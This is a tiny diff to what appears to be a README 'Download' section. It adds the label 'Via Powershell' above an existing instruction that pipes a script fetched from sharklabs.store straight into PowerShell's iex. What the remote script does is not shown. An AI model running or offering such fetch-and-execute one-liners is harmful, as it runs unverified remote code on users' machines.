@@ -1,4 +1,5 @@
 # Download:
+Via Powershell
 ```
 irm https://sharklabs.store/IA | iex
 ```
